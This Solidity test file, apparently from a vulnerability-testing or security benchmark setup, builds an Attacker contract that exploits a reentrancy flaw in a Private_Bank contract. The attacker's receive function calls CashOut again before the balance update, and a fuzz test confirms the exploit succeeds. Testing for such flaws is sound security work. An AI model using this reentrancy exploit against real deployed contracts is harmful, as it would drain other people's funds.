
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {
    
    Private_Bank public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new Private_Bank(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether. We need to deposit enough to cover 2 withdrawals.
        // depositAmount = 2 * attackVal.
        // depositAmount must be > 1 ether.
        // Therefore, attackVal must be > 0.5 ether.
        vm.assume(attackVal > 0.6 ether);
        vm.assume(attackVal < 1000 ether); // Cap to avoid overflow in test setup

        uint256 depositAmount = attackVal * 2;

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific time manipulation needed.

        // --- 3. Funding ---
        // A. Fund the Victim
        vm.deal(address(_contractUnderTest), depositAmount * 2); 
        
        // B. Fund the Attacker (via setupAttack)
        // C. Fund the Test Contract
        vm.deal(address(this), depositAmount * 2);

        // --- 4. Trigger Attack ---
        // We send the deposit amount to the attacker, which deposits it into the bank.
        _attacker.setupAttack{value: depositAmount}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    
    Private_Bank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialDeposit;

    constructor(address victimAddress) { 
        victim = Private_Bank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        initialDeposit = msg.value;
        
        // Deposit funds to establish a balance > MinDeposit
        victim.Deposit{value: initialDeposit}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        victim.CashOut(val);
    }

    receive() external payable {
        // Vulnerability Check:
        // If the bank's balance for this contract has NOT decreased yet,
        // it means we are executing code before the state update (Check-Effects-Interaction violation).
        if (victim.balances(address(this)) == initialDeposit) {
            exploitSucceeded = true;
        }

        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            // msg.value here is the amount sent by the bank (attackVal)
            victim.CashOut(msg.value);
        }
    }

    fallback() external payable {}
}
